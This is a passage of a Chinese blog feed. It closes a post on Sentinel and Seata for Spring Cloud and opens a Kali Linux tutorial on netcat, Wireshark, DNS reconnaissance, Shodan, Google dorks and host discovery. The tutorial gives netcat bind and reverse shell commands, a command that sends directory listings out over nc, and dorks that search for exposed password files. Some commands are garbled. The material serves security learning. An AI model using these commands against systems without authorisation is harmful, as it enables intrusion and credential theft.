href="https://github.com/alibaba/Sentinel/wiki/%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7" target="_blank" rel="noopener"><strong>熔断降级</strong></a>会在调用链路中某个资源出现不稳定状态时（例如调用超时或异常比例升高），对这个资源的调用进行限制，让请求快速失败，避免影响到其它的资源而导致级联错误。当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断</p><ul><li>平均响应时间 (<code>DEGRADE_GRADE_RT</code>)：当 1s 内持续进入 N 个请求，对应时刻的平均响应时间（秒级）均超过阈值（<code>count</code>，以 ms 为单位），那么在接下的时间窗口（<code>DegradeRule</code> 中的 <code>timeWindow</code>，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 <code>DegradeException</code>）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，<strong>超出此阈值的都会算作 4900 ms</strong>，若需要变更此上限可以通过启动配置项 <code>-Dcsp.sentinel.statistic.max.rt=xxx</code> 来配置。</li><li>异常比例 (<code>DEGRADE_GRADE_EXCEPTION_RATIO</code>)：当资源的每秒请求量 &gt;= N（可配置），并且每秒异常总数占通过量的比值超过阈值（<code>DegradeRule</code> 中的 <code>count</code>）之后，资源进入降级状态，即在接下的时间窗口（<code>DegradeRule</code> 中的 <code>timeWindow</code>，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 <code>[0.0, 1.0]</code>，代表 0% - 100%。</li><li>异常数 (<code>DEGRADE_GRADE_EXCEPTION_COUNT</code>)：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 <code>timeWindow</code> 小于 60s，则结束熔断状态后仍可能再进入熔断状态。</li></ul><h4 id="Sentinel热点key"><a href="#Sentinel热点key" class="headerlink" title="Sentinel热点key"></a>Sentinel热点key</h4><p>何为热点？热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTclODMlQUQlRTclODIlQjklRTUlOEYlODIlRTYlOTUlQjAlRTklOTklOTAlRTYlQjUlODE=">限制<i class="fa fa-external-link-alt"></i></span>。比如：</p><ul><li>商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制</li><li>用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制</li></ul><p>热点参数限流会统计传入参数中的热点参数，并根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。热点参数限流可以看做是一种特殊的流量控制，仅对包含热点参数的资源调用生效。</p><p>Sentinel 利用 LRU 策略统计最近最常访问的热点参数，结合令牌桶算法来进行参数级别的流控。热点参数限流支持集群模式。</p><h4 id="Sentinel系统规则"><a href="#Sentinel系统规则" class="headerlink" title="Sentinel系统规则"></a>Sentinel系统规则</h4><p>Sentinel <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTclQjMlQkIlRTclQkIlOUYlRTglODclQUElRTklODAlODIlRTUlQkElOTQlRTklOTklOTAlRTYlQjUlODE=">系统自适应限流<i class="fa fa-external-link-alt"></i></span>从整体维度对应用入口流量进行控制，结合应用的 Load、CPU 使用率、总体平均 RT、入口 QPS 和并发线程数等几个维度的监控指标，通过自适应的流控策略，让系统的入口流量和系统的负载达到一个平衡，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性</p><h4 id="SentinelResource自定义配置"><a href="#SentinelResource自定义配置" class="headerlink" title="@SentinelResource自定义配置"></a>@SentinelResource自定义配置</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200724110933099.png" alt="image-20200724110933099"></p><ul><li>fallback管理<strong>内部异常</strong></li><li>blockhandler管理<strong>熔断限流配置</strong>异常（外部）</li></ul><h4 id="Sentinel持久化规则"><a href="#Sentinel持久化规则" class="headerlink" title="Sentinel持久化规则"></a>Sentinel持久化规则</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud ailibaba sentineL - datasource -nacos后续做持久化用到--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">datasource :</span></span><br><span class="line">	<span class="attr">ds1:</span></span><br><span class="line">		<span class="attr">nacos:</span></span><br><span class="line">			<span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">            <span class="attr">dataId:</span> <span class="string">Cloudalibaba</span> <span class="string">-sentinel-service</span></span><br><span class="line">            <span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">            <span class="attr">data-type:</span> <span class="string">json</span></span><br><span class="line">            <span class="attr">rule -type:</span> <span class="string">flow</span></span><br></pre></td></tr></table></figure><blockquote><p>去Nacos控制台创建json配置文件</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"resource"</span>: <span class="string">"/rateLimit/byUrl"</span>,</span><br><span class="line">        <span class="attr">"limitApp"</span>: <span class="string">"default"</span>,</span><br><span class="line">        <span class="attr">"grade"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"count"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"strategy"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"controlBehavior"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"clusterMode"</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="Senta处理分布式事务"><a href="#Senta处理分布式事务" class="headerlink" title="Senta处理分布式事务"></a>Senta处理分布式事务</h3><p><span class="exturl" data-url="aHR0cHM6Ly9zZWF0YS5pby96aC1jbi9kb2NzL292ZXJ2aWV3L3doYXQtaXMtc2VhdGEuaHRtbA==">官网<i class="fa fa-external-link-alt"></i></span></p><h4 id="TC-Transaction-Coordinator-事务协调者"><a href="#TC-Transaction-Coordinator-事务协调者" class="headerlink" title="TC (Transaction Coordinator) - 事务协调者"></a>TC (Transaction Coordinator) - 事务协调者</h4><p>维护全局和分支事务的状态，驱动全局事务提交或回滚。</p><h4 id="TM-Transaction-Manager-事务管理器"><a href="#TM-Transaction-Manager-事务管理器" class="headerlink" title="TM (Transaction Manager) - 事务管理器"></a>TM (Transaction Manager) - 事务管理器</h4><p>定义全局事务的范围：开始全局事务、提交或回滚全局事务。</p><h4 id="RM-Resource-Manager-资源管理器"><a href="#RM-Resource-Manager-资源管理器" class="headerlink" title="RM (Resource Manager) - 资源管理器"></a>RM (Resource Manager) - 资源管理器</h4><p>管理分支事务处理的资源，与TC交谈以<strong>注册分支事务</strong>和<strong>报告分支事务的状态</strong>，并驱动分支事务提交或回滚。</p><p>Senta的AT模式是来自于两阶段过程的改进</p>]]></content>
      <categories>
        <category>Spring框架</category>
      </categories>
      <tags>
        <tag>微服务</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali使用教程（一）：常用命令和基本工具使用</title>
    <url>/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><code>netstat -pantu</code> ：查看本机与外界的TCP/UDP连接</li><li><code>sudo passwd root</code>：为root设置密码</li></ul><a id="more"></a><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="NC-NETCAT"><a href="#NC-NETCAT" class="headerlink" title="NC-NETCAT"></a><code>NC-NETCAT</code></h4><blockquote><p>nc是一款远程传输，控制工具。使用nc -h 命令查看参数描述</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608153428232.png" alt="image-20200608153428232"></p><h5 id="NC——获取Banner信息"><a href="#NC——获取Banner信息" class="headerlink" title="NC——获取Banner信息"></a>NC——获取Banner信息</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nv x.x.x.x port  nc作为客户端连接对方服务器</span><br><span class="line">说明：</span><br><span class="line">	-v 显示详细信息</span><br><span class="line">	-n 后面添加ip地址，不会进行DNS解析</span><br></pre></td></tr></table></figure><p>测试：</p><blockquote><p>首先使用ping + 域名 获取ip地址</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608105457977.png" alt="image-20200608105457977"></p><blockquote><p>由于pop3的端口为110，直接用nc -nv命令连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608110108800.png" alt="image-20200608110108800"></p><h5 id="NC——传输文本（Telnet）"><a href="#NC——传输文本（Telnet）" class="headerlink" title="NC——传输文本（Telnet）"></a>NC——传输文本（Telnet）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A:nc -l -p port 监听端port端口</span><br><span class="line">B:nc -nv x.x.x.x port 发送端,x.x.x.x为监听端ip</span><br><span class="line"></span><br><span class="line">用途：电子取证、信息收集</span><br><span class="line"></span><br><span class="line">示例：我们希望将远程服务端的文件目录发送到本机，并且不显示远程主机上，可以使用如下命令:</span><br><span class="line"></span><br><span class="line">远程服务器：ls -l | nc -nv x.x.x.x port -q 1 这里-q 1表示发送完成后等待1s时间就退出nc</span><br><span class="line"></span><br><span class="line">接收端：nc -l -p port &gt; log.txt 监听并将信息保存在log.txt文件中大萨达</span><br></pre></td></tr></table></figure><h5 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">传输文件: </span><br><span class="line">	从B--&gt;A</span><br><span class="line">	A: nc -lp port &gt; video.mp4</span><br><span class="line">	B: nc -nv x.x.x.x port &lt; video.mp4 -q 1 </span><br><span class="line">			&lt;符号表示传入数据，&gt;符号表示保存数据</span><br><span class="line">	</span><br><span class="line">    也可以从A--&gt;B</span><br><span class="line">    A: nc -lp port &lt; video.mp4 -q 1 </span><br><span class="line">	B: nc -nv x.x.x.x port &gt; video.mp4 </span><br><span class="line"></span><br><span class="line">传输目录：</span><br><span class="line">	原理类似，只不过需要在传输过程对目录打包和解压</span><br><span class="line">	A:tar -cvf - /music | nc -l -p port -q 1</span><br><span class="line">	B:nc -nv x.x.x.x port | tar -xvf -</span><br></pre></td></tr></table></figure><h5 id="NC——端口扫描（不太准确，不常用）"><a href="#NC——端口扫描（不太准确，不常用）" class="headerlink" title="NC——端口扫描（不太准确，不常用）"></a>NC——端口扫描（不太准确，不常用）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nvz x.x.x.x 1-65535 探测所有tcp端口</span><br><span class="line">nc -nvzu x.x.x.x 1-1024	探测udp端口</span><br></pre></td></tr></table></figure><h5 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">正向控制：</span><br><span class="line">	A:nc -lp port -c bash A提供bash</span><br><span class="line">	B:nc x.x.x.x port B使用bash</span><br><span class="line">	</span><br><span class="line">反向控制： </span><br><span class="line">	A:nc -lp port A使用bash</span><br><span class="line">	B:nc x.x.x.x port -c bash B提供bash</span><br><span class="line">	</span><br><span class="line">思考：在渗透测试中，正向控制一般是会被防火墙拦截的，所以可以尝试反向控制，让服务端连接自己暴露的端口</span><br><span class="line"></span><br><span class="line">注意：Windwos平台将bash改成cmd</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>NC缺乏加密和身份验证的能力，不安全。可以使用NCAT来弥补NC的不足， 因为它是支持SSL加密，NCAT包含于nmap中</p></blockquote><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><code>Wireshark</code></h4><blockquote><p>Wireshark是一款抓包嗅探、协议分析的工具。</p></blockquote><h5 id="使用wireshark抓包"><a href="#使用wireshark抓包" class="headerlink" title="使用wireshark抓包"></a>使用wireshark抓包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">这里以抓取本机网卡数据包为例。首先打开终端，尝试ping百度</span><br><span class="line"></span><br><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">同时打开wireshark，选则虚拟机网卡eth0，再启动抓包</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608163108785.png" alt="image-20200608163108785"></p><blockquote><p>这里可以保存抓包数据文件，建议保存为pcap格式，兼容性较好。</p></blockquote><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><blockquote><p>wireshark可以针对ip、域名、协议进行过滤，支持组合表达式，称为过滤器。如下图中，可以选则当前协议行作为过滤器应用。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608165600432.png" alt="image-20200608165600432"></p><h5 id="常见协议包"><a href="#常见协议包" class="headerlink" title="常见协议包"></a>常见协议包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wireshark默认通过端口来识别协议类型，如80端口识别为http，如有必要需要手动指定协议类型</span><br><span class="line"></span><br><span class="line">数据包协议如下：ARP、ICMP、TCP、UDP、DNS、http、ftp</span><br><span class="line"></span><br><span class="line">TCP数据流：HTTP、SMTP、POP3、SSL/TLS（加密传输，无法查看内容）</span><br></pre></td></tr></table></figure><h5 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">follow</span> tcp <span class="keyword">stream：查看传输内容</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Endpoints:查看每种协议具体的ip、包大小、发送数量。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">协议分级：查看当前帧下的所有协议流量所占百分比。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">分组长度：查看不同大小包所占百分比。小包过多会导致瘫痪，可能是攻击行为。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Conversitions：查看所有会话之间的通信情况。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">专家系统：针对连接提供一些建议或提示</span></span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><blockquote><p>wireshark 不适用于抓取大量报，因此企业使用一般会使用类似于</p><p>Sniffer、Cace、Cascad poit等。</p></blockquote><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="DNS信息收集——NSLOOKUP"><a href="#DNS信息收集——NSLOOKUP" class="headerlink" title="DNS信息收集——NSLOOKUP"></a>DNS信息收集——NSLOOKUP</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">使用nslookup查看域名解析过程和对应ip</span><br><span class="line"></span><br><span class="line">tosang@kali:~/桌面$ nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.baidu.com</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.com   canonical name = www.a.shifen.com.</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.125</span><br><span class="line">Name:   www.a.shifen.com</span><br><span class="line">Address: 61.135.169.121</span><br></pre></td></tr></table></figure><h4 id="DNS信息收集——DIG（更强大）"><a href="#DNS信息收集——DIG（更强大）" class="headerlink" title="DNS信息收集——DIG（更强大）"></a>DNS信息收集——DIG（更强大）</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609102507339.png" alt="image-20200609102507339"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">根据自定义域名服务器查询：dig @8.8.8.8 www.sina.com mx</span><br><span class="line"></span><br><span class="line">正向查询：dig www.sina.com any </span><br><span class="line"></span><br><span class="line">反向查询（使用ptr反向解析）: dig +noall +answer -x 8.8.8.8</span><br><span class="line">		其中+noall +answer表示省略无用信息</span><br><span class="line"></span><br><span class="line">bind版本信息: dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com </span><br><span class="line">			通过查询bind版本信息可以分析是否存在漏掉可以利用</span><br><span class="line"></span><br><span class="line">DNS追踪: dig +trace example.com</span><br><span class="line"></span><br><span class="line">抓包比较递归查询、迭代查询过程的区别</span><br></pre></td></tr></table></figure><hr><blockquote><p>DNS追踪示例：图中是13个根域名服务器（root域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105201886.png" alt="image-20200609105201886"></p><blockquote><p>接着查询.com域名服务器地址（com域）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609105435329.png" alt="image-20200609105435329"></p><blockquote><p>然后从这些.com域名中随机挑选一个ip去查询baidu.com域的ns记录</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111657846.png" alt="image-20200609111657846"></p><blockquote><p>最后从ns记录中随机挑选一个去查询<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23orrDlvZXlvpfliLBjbmFtZee7k+aenO+8jOino+aekGNuYW1l5Y+v5Lul5LuO55m+5bqm55qE5Z+f5ZCN5pyN5Yqh5Zmo77yIbnPvvInlvpfliLDmnIDnu4hpcOWcsOWdgA==">www.baidu.com记录得到cname结果，解析cname可以从百度的域名服务器（ns）得到最终ip地址<i class="fa fa-external-link-alt"></i></span></p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609111723401.png" alt="image-20200609111723401"></p><h4 id="DNS区域传输（Zone-Transfer）"><a href="#DNS区域传输（Zone-Transfer）" class="headerlink" title="DNS区域传输（Zone Transfer）"></a>DNS区域传输（Zone Transfer）</h4><blockquote><p>区域传输是指域名服务器之间同步数据的过程，通过区域传输可以获得某一个域里面的所有主机记录</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">以下命令可以尝试去连接域名服务器，但一般会被拒绝</span><br><span class="line">dig @ns1.example.com example.com axfr</span><br><span class="line">host -T -l sina.com8.8.8.8</span><br></pre></td></tr></table></figure><h4 id="DNS爆破"><a href="#DNS爆破" class="headerlink" title="DNS爆破"></a>DNS爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt </span><br><span class="line">	fierce自带字典host.txt，可以通过命令 查看</span><br><span class="line"></span><br><span class="line">dnsdict6 -d4 -t 16 -x sina.com </span><br><span class="line">	默认集成多种字典，命中率高，执行速度快，最常用</span><br><span class="line"></span><br><span class="line">dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -0 sina.xml</span><br><span class="line"></span><br><span class="line">dnsmap sina.com -W dns.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -d sina.com -lifetime 10 -t brt -D dnsbig.txt</span><br><span class="line"></span><br><span class="line">dnsrecon -t std -d sina.com</span><br></pre></td></tr></table></figure><h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：一般大型互联网企业域名都做了反查询，所以会查不到</span><br><span class="line"></span><br><span class="line">Whois </span><br><span class="line"></span><br><span class="line">whois -h whois.apnic.net 192.0.43.10</span><br></pre></td></tr></table></figure><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHODAN：使用前需要到shodan官网注册一个账号，并获取自己的API Key</span><br><span class="line"></span><br><span class="line">搜索联网的设备</span><br><span class="line">Banner: http、 ftp、 ssh、 telnet</span><br><span class="line">https://www.shodanio/</span><br><span class="line">常见filter:</span><br><span class="line">	net (192. 168.20.1)</span><br><span class="line">	city</span><br><span class="line">	country (CN、US)</span><br><span class="line">	port (80、 21、22、23)</span><br><span class="line">	OS</span><br><span class="line">	Hostname (主机或域名)</span><br><span class="line">	server</span><br><span class="line">	</span><br><span class="line">示例：搜索中国地区端的81端口ip</span><br><span class="line">port:81 country:CN HTTP/1.1 200</span><br></pre></td></tr></table></figure><blockquote><p>使用示例：首先通过nc获取某个域名的ip，这里以gscaep.ac.cn为例</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161551929.png" alt="image-20200609161551929"></p><blockquote><p>使用shodan来搜索该ip的所有信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609161728440.png" alt="image-20200609161728440"></p><blockquote><p>这一刀这里暴露了使用的数据库版本及其端口信息，可以尝试用nc去连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609162101517.png" alt="image-20200609162101517"></p><h4 id="GOOGLE搜索方法"><a href="#GOOGLE搜索方法" class="headerlink" title="GOOGLE搜索方法"></a>GOOGLE搜索方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+充值 -支付  +代表含有，-代表排除</span><br><span class="line"></span><br><span class="line">北京的电子商务公司—— 北京 intitle:电子商务 intext:法人 intext:电话</span><br><span class="line"></span><br><span class="line">阿里网站上的北京公司联系人——北京 site:alibaba.com inurl:contact</span><br><span class="line"></span><br><span class="line">塞班司法案的PDF文档——SOX filetype:pdf</span><br><span class="line"></span><br><span class="line">法国的支付相关页面——payment site:fr</span><br><span class="line"></span><br><span class="line">一些常用实例：</span><br><span class="line">inurt:"level/15/exec/-/show"</span><br><span class="line">intille: "netbotz appliance" "ok"</span><br><span class="line">inurl /admin/login.php</span><br><span class="line">inurt:qq.txt</span><br><span class="line">filetype:xls "username| password"</span><br><span class="line">inud:ftp "password" filetype:xls site:baidu.com</span><br><span class="line">Inurd:Service.pwd</span><br><span class="line">http://exploit.db.com/google-dorks</span><br></pre></td></tr></table></figure><h4 id="搜索工具"><a href="#搜索工具" class="headerlink" title="搜索工具"></a>搜索工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theHarvester 可以使用google、bing等搜索引擎搜索文域名、邮件，需要翻墙</span><br><span class="line"></span><br><span class="line">Maltego 图形化展示搜索工具，kali十大工具之一</span><br></pre></td></tr></table></figure><h4 id="文件信息——METADATA（元数据）"><a href="#文件信息——METADATA（元数据）" class="headerlink" title="文件信息——METADATA（元数据）"></a>文件信息——METADATA（元数据）</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">exiftool</span> <span class="string">xx.jpg  查看图片Exif图片信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Foca</span> <span class="string">windows平台软件</span></span><br></pre></td></tr></table></figure><h4 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><blockquote><p>RECON-NG是一个全特性的，基于Python的web侦探框架。输入help查看所有命令含义</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609191006019.png" alt="image-20200609191006019"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常用命令：</span><br><span class="line"></span><br><span class="line">recon-ng sina   建立名为sina的工作区</span><br><span class="line">keys add baidu_api api 为baidu_api添加api</span><br><span class="line">keys remove xxx 移除某个api</span><br><span class="line">keys list 查看所有api</span><br><span class="line"></span><br><span class="line">安装模块：</span><br><span class="line">marketplace refresh # 更新模块列表</span><br><span class="line">marketplace search hackertarget # 搜索 hackertarget 模块，可以发现支持模糊搜索</span><br><span class="line">marketplace install recon/domains-hosts/hackertarget # 复制模块名，安装</span><br><span class="line"></span><br><span class="line">使用模块：</span><br><span class="line">modules load recon/domains-hosts/hackertarget # 加载模块</span><br><span class="line">info # 查看模块的描述信息及参数。这里发现该模块是用来搜索主机名。</span><br><span class="line"></span><br><span class="line">help # 查看该模块下的使用命令，其中 options 用来修改模块的参数。（goptions 是全局参数，在非模块模式下才可修改。）</span><br><span class="line">options set SOURCE rapid7.com # 设置 SOURCE 参数（用来探测 rapid7.com的主机）</span><br><span class="line">run # 设置好参数后，直接运行。</span><br><span class="line">show hosts # 在上述 hackertarget 的描述中发现，会把搜索记录 放到 hosts 表中，可以使用 show 命令查看。</span><br></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="二层发现——arping"><a href="#二层发现——arping" class="headerlink" title="二层发现——arping"></a>二层发现——arping</h4><blockquote><p>二层发现使用arp协议，在局域网下进行</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arping 用于在局域网通过目标ip获取mac地址</span><br><span class="line"></span><br><span class="line">arping 1.1.1.1 -c 1</span><br><span class="line">arping 1.1.1.1 -d 发现同一ip下重复的mac</span><br><span class="line">arping c1 1.1.1.1 | grep "bytes from" | cut d"-f5 | cut d"T"-f2 I cut -d"]"-f 1</span><br><span class="line">脚本</span><br><span class="line">	arping l.sh etho &gt; addrs</span><br><span class="line">	arping 2.sh addrs</span><br><span class="line"></span><br><span class="line">场景：通过编写脚本，arping可以发现子网段的所有连接的ip及其mac地址</span><br></pre></td></tr></table></figure><h4 id="二层发现——nmap（常用）"><a href="#二层发现——nmap（常用）" class="headerlink" title="二层发现——nmap（常用）"></a>二层发现——nmap（常用）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -sn 扫描ping，但是不去扫描端口</span><br><span class="line">		namp在扫描的时候会尝试对找到的ip进行反向查询dns获取其域名</span><br><span class="line">nmap -iL iplist.txt sn</span><br></pre></td></tr></table></figure><h4 id="二层发现——Netdiscover"><a href="#二层发现——Netdiscover" class="headerlink" title="二层发现——Netdiscover"></a>二层发现——Netdiscover</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Netdiscover专用于二层发现，可用于无线和交换网络环境，主动和被动探测</span><br><span class="line"></span><br><span class="line">主动探测：</span><br><span class="line">netdiscover -i ethO T 1.1.1 .0/24</span><br><span class="line">netdiscover -1 iplist.txt</span><br><span class="line"></span><br><span class="line">被动：</span><br><span class="line">（主动arp容易触发报警，伪装成局域网一部分，截取arp数据包分析）</span><br><span class="line">netdiscover -P</span><br></pre></td></tr></table></figure><h4 id="二层发现——Scapy"><a href="#二层发现——Scapy" class="headerlink" title="二层发现——Scapy"></a>二层发现——Scapy</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Scapy</span><br><span class="line">	作为Python库进行调用</span><br><span class="line">	也可作为单独的工具使用</span><br><span class="line">	抓包、分析、创建、修改、注入网络流量</span><br><span class="line"></span><br><span class="line">apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">Scapy</span><br><span class="line">	ARP().display()</span><br><span class="line">	Sr1()</span><br><span class="line">	</span><br><span class="line">Python脚本</span><br><span class="line">	Arpl.py</span><br><span class="line">	Arp2.py</span><br></pre></td></tr></table></figure><h4 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h4><blockquote><p>优点：可路由、速度比较快<br>缺点：速度比二层慢、经常被边界防火墙过滤<br>协议：IP、ICMP协议。在广域网进行</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">说明：ttl值在linux系统性一般是64，每经过一跳路由自动减一</span><br><span class="line"></span><br><span class="line">Ping 1.1.1.1 -c 2 </span><br><span class="line">		-c指定发送几个请求</span><br><span class="line">Ping-R 1.1.1.1 / traceroute 1.1.1.1</span><br><span class="line">ping 1.1.1.1-C 1 | grep "bytes from" | cut -d "" -f4 | cut-d":"-f 1</span><br><span class="line"></span><br><span class="line">pmap -sn 1.1.1.1 -255</span><br><span class="line">nmap -iL iplist.txt -sn</span><br><span class="line"></span><br><span class="line">Hping</span><br><span class="line">	能够发送几乎任意TCP/IP包</span><br><span class="line">	功能强大但每次只能扫描一个目标</span><br><span class="line">	</span><br><span class="line">hping3 1.1.1.1 -icmp -C 2</span><br><span class="line">for addr in $(seq 1 254); do hping3 1.1.1.$addr icmp C I &gt;&gt; handle.txt &amp; done</span><br></pre></td></tr></table></figure><h4 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h4><blockquote><p>优点：可路由且结果可靠、不太可能被防火墙过滤、甚至可以发现所有端口都被过滤的主机<br>缺点：基于状态过滤的防火墙可能过滤扫描、全端口扫描速度慢<br>TCP：未经请求的ACK- RST、SYN-SYN/ACK、 RST<br>UDP：ICMP端口不可达、一去不复返</p></blockquote><figure class="highlight 